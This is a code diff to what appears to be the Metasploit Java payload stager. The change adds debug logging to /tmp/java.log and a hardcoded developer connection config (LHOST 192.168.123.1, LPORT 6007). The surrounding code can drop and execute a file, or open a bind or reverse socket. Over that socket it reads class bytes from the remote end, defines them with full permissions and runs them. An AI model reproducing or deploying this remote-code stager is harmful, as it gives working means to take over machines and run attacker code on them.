@@ -33,16 +33,7 @@
  */
 package metasploit;
 
-import java.io.ByteArrayInputStream;
-import java.io.ByteArrayOutputStream;
-import java.io.DataInputStream;
-import java.io.File;
-import java.io.FileNotFoundException;
-import java.io.FileOutputStream;
-import java.io.IOException;
-import java.io.InputStream;
-import java.io.OutputStream;
-import java.io.PrintStream;
+import java.io.*;
 import java.net.ServerSocket;
 import java.net.Socket;
 import java.net.URL;
@@ -66,15 +57,58 @@ import java.util.StringTokenizer;
  */
 public class Payload extends ClassLoader {
 
+    public static void dprintf(String message) {
+        FileWriter fileWriter = null;
+        BufferedWriter bufferedWriter = null;
+        PrintWriter printWriter = null;
+        try {
+            fileWriter = new FileWriter("/tmp/java.log", true);
+            bufferedWriter = new BufferedWriter(fileWriter);
+            printWriter = new PrintWriter(bufferedWriter);
+            printWriter.println(message);
+            printWriter.close();
+        } catch (IOException e) {
+            // we failed, move on.
+        } finally {
+            if (printWriter != null) {
+                printWriter.close();
+            }
+
+            try {
+                if (bufferedWriter != null) {
+                    bufferedWriter.close();
+                }
+            } catch (IOException e) {
+                // we failed, move on.
+            }
+
+            try {
+                if (fileWriter != null) {
+                    fileWriter.close();
+                }
+            } catch (IOException e) {
+                // we failed, move on.
+            }
+        }
+    }
+
     public static void main(String[] ignored) throws Exception {
+        dprintf("[+] Starting payload latest");
+
         // Find our properties. If we are running inside the jar, they are in a resource stream called "/metasploit.dat".
         Properties props = new Properties();
         Class clazz = Payload.class;
         String clazzFile = clazz.getName().replace('.', '/') + ".class";
         InputStream propsStream = clazz.getResourceAsStream("/metasploit.dat");
         if (propsStream != null) {
+            dprintf("Reading config from metasploit.dat");
             props.load(propsStream);
             propsStream.close();
+        } else {
+            dprintf("Reading properties from developer config");
+            props.setProperty("Spawn", "0");
+            props.setProperty("LHOST", "192.168.123.1");
+            props.setProperty("LPORT", "6007");
         }
 
         // check if we should drop an executable
@@ -94,6 +128,8 @@ public class Payload extends ClassLoader {
         int spawn = Integer.parseInt(props.getProperty("Spawn", "0"));
         String droppedExecutable = props.getProperty("DroppedExecutable");
         if (spawn > 0) {
+            dprintf("Spawning");
+
             // decrease count so that eventually the process
             // will stop spawning
             props.setProperty("Spawn", String.valueOf(spawn - 1));
@@ -146,6 +182,8 @@ public class Payload extends ClassLoader {
                 }
             }
         } else if (droppedExecutable != null) {
+            dprintf("Dropped executable available");
+
             File droppedFile = new File(droppedExecutable);
             // File.setExecutable is Java 1.6+, therefore call it via reflection and try
             // the chmod alternative if it fails. Do not call it at all for Windows.
@@ -173,6 +211,8 @@ public class Payload extends ClassLoader {
                 droppedFile.getParentFile().delete();
             }
         } else {
+            dprintf("Using bind/reverse");
+
             // check what stager to use (bind/reverse)
             int lPort = Integer.parseInt(props.getProperty("LPORT", "4444"));
             String lHost = props.getProperty("LHOST", null);
@@ -230,6 +270,7 @@ public class Payload extends ClassLoader {
             for (int i = 0; i < stageParams.length; i++) {
                 stageParams[i] = stageParamTokenizer.nextToken();
             }
+            dprintf("Calling payload bootstrap");
             new Payload().bootstrap(in, out, props.getProperty("EmbeddedStage", null), stageParams);
         }
     }
@@ -269,18 +310,24 @@ public class Payload extends ClassLoader {
             final ProtectionDomain pd = new ProtectionDomain(new CodeSource(new URL("file:///"), new Certificate[0]), permissions);
             if (embeddedStageName == null) {
                 int length = in.readInt();
+                dprintf("Reading " + length + " bytes");
                 do {
                     final byte[] classfile = new byte[length];
                     in.readFully(classfile);
                     resolveClass(clazz = defineClass(null, classfile, 0, length, pd));
+                    dprintf("Resolving class: " + clazz);
                     length = in.readInt();
                 } while (length > 0);
             } else {
                 clazz = Class.forName("javapayload.stage." + embeddedStageName);
             }
             final Object stage = clazz.newInstance();
+            dprintf("Invoking final class " + clazz);
             clazz.getMethod("start", new Class[]{DataInputStream.class, OutputStream.class, String[].class}).invoke(stage, in, out, stageParameters);
         } catch (final Throwable t) {
+            StringWriter stringWriter = new StringWriter();
+            t.printStackTrace(new PrintWriter(stringWriter));
+            dprintf(stringWriter.toString());
             t.printStackTrace(new PrintStream(out));
         }
     }
